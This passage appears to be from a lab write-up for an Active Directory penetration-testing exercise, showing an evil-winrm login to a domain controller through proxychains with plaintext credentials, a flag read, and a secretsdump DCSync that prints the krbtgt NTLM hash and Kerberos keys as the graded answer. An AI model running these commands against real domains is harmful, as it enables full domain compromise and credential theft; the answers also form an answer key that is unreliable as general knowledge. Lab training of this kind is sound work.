   - Now we can access the DC01 via evil-winrm with CT059 credentials and read the flag:
      ```sh
      $ proxychains evil-winrm -i 172.16.7.3 -u 'CT059' -p 'charlie1'
      [proxychains] config file found: /etc/proxychains.conf
      [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
      [proxychains] DLL init: proxychains-ng 4.16
                                              
      Evil-WinRM shell v3.5
                                              
      Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                              
      Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                              
      Info: Establishing connection to remote endpoint
      [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.7.3:5985  ...  OK
      *Evil-WinRM* PS C:\Users\CT059\Documents> more ../../Administrator/Desktop/flag.txt
      [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.7.3:5985  ...  OK
      [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.7.3:5985  ...  OK
      acLs_f0r_th3_w1n!
      ```
12. Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise. **Answer: 7eba70412d81c1cd030d72a3e8dbe05f**
   - We can easily retrieve the NTLM hash for the KRBTGT account using secretsdump.py from our Parrot Linux VM inside the internal network:
      ```sh
      $secretsdump.py inlanefreight.local/CT059@172.16.7.3 -just-dc-user INLANEFREIGHT/krbtgt
      Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

      Password:
      [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
      [*] Using the DRSUAPI method to get NTDS.DIT secrets
      krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
      [*] Kerberos keys grabbed
      krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
      krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
      krbtgt:des-cbc-md5:e0a7fbc176c28a37
      [*] Cleaning up...
      ```


